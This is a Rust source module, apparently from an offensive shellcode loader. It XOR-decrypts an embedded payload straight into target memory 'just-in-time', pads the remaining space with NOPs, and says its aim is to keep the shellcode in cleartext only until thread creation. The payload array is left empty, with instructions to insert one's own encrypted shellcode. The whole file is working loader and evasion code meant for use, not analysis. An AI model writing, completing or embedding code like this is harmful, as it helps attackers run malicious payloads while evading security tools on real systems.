//! XOR-based shellcode encryption and decryption.
//!
//! Provides in-place decryption of shellcode using a multi-byte XOR key.
//! The encrypted payload is embedded at compile time and decrypted directly
//! into the target memory region (just-in-time decryption).

use crate::debug_println;

/// XOR key for shellcode encryption/decryption (32 bytes).
const XOR_KEY: [u8; 32] = [
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x13, 0x37, 0xC0, 0xDE, 0xF0, 0x0D, 0xFA, 0xCE,
    0xB0, 0x0B, 0x1E, 0x55, 0xDE, 0xAD, 0xC0, 0xFF,
    0xEE, 0xBA, 0xBE, 0xFA, 0xCE, 0x00, 0x00, 0x00,
];

/// Encrypted shellcode payload (embedded at compile time).
///
/// Replace this array with your own XOR-encrypted shellcode.
/// Use the same `XOR_KEY` to encrypt: `encrypted[i] = raw[i] ^ XOR_KEY[i % 32]`
pub const SHELLCODE_ENCRYPTED: [u8; 0] = [];

/// Decrypts `SHELLCODE_ENCRYPTED` directly into the destination buffer using
/// multi-byte XOR. Remaining space is filled with NOPs (0x90).
///
/// This is the "just-in-time" step — shellcode only exists in cleartext for
/// the brief moment between this call and thread creation.
///
/// # Safety
/// `dest` must point to a writable allocation of at least `dest_size` bytes.
pub unsafe fn decrypt_to(dest: *mut u8, dest_size: usize) {
    let len = SHELLCODE_ENCRYPTED.len().min(dest_size);

    debug_println!("[+] JIT decryption: {} bytes → 0x{:X}", len, dest as usize);

    // Decrypt directly into target memory
    for i in 0..len {
        *dest.add(i) = SHELLCODE_ENCRYPTED[i] ^ XOR_KEY[i % XOR_KEY.len()];
    }

    // Pad remaining space with NOPs
    if len < dest_size {
        std::ptr::write_bytes(dest.add(len), 0x90, dest_size - len);
    }
}
